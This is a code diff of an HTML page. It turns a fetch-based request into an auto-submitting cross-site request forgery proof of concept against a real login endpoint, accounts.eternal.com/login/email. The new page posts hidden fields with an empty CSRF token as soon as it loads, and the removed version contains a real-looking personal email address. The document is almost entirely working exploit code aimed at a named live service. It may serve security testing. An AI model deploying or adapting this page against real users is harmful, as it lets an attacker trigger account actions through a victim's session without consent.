@@ -1,38 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=, initial-scale=1.0">
-    <title>Document</title>
+  <meta charset="UTF-8">
+  <title>CSRF PoC - accounts.eternal.com /login/email</title>
 </head>
 <body>
-    <button onclick="jajal()">click here</button>
-    <script>
-        function jajal() {
-        const formData = new FormData();
-formData.append("email", "bismillah54366@gmail.com");
-formData.append("csrf_token", "");
-formData.append("lc", "1eef4a5b8ae4427fa40bd23003baa7d1");
-formData.append("type", "initiate");
-formData.append("otp", "");
-formData.append("invite_id", "");
-formData.append("theme", "");
-formData.append("name", "");
+  <h3>CSRF PoC: /login/email (type=initiate)</h3>
+  <p>This form auto-submits a cross-site request to the target endpoint using multipart/form-data, mirroring the captured request. Open this page while logged in / with an active session on the target to test whether the request is accepted without a valid CSRF token.</p>
 
-fetch("https://accounts.eternal.com/login/email", {
-  method: "POST",
-  headers: {
-    "x-zomato-csrft": "",
-    // Jangan set Content-Type secara manual untuk multipart/form-data,
-    // browser akan otomatis menambahkan header ini beserta boundary-nya
-  },
-  credentials: "include", // karena ada cookie/session (Sec-Fetch-Site: same-origin)
-  body: formData
-})
-  .then(response => response.json()) // sesuaikan dengan format response aslinya
-  .then(data => console.log(data))
-  .catch(error => console.error("Error:", error));
-}
-    </script>
+  <form id="csrf-poc" action="https://accounts.eternal.com/login/email" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="email" value="attacker-controlled-or-victim-email@example.com">
+    <input type="hidden" name="csrf_token" value="">
+    <input type="hidden" name="lc" value="1eef4a5b8ae4427fa40bd23003baa7d1">
+    <input type="hidden" name="type" value="initiate">
+    <input type="hidden" name="otp" value="">
+    <input type="hidden" name="invite_id" value="">
+    <input type="hidden" name="theme" value="">
+    <input type="hidden" name="name" value="">
+    <input type="submit" value="Submit request (or auto-submits below)">
+  </form>
+
+  <script>
+    // Auto-submit on page load for PoC purposes.
+    // Comment this out if you want to manually trigger submission instead.
+    document.getElementById('csrf-poc').submit();
+  </script>
 </body>
 </html>
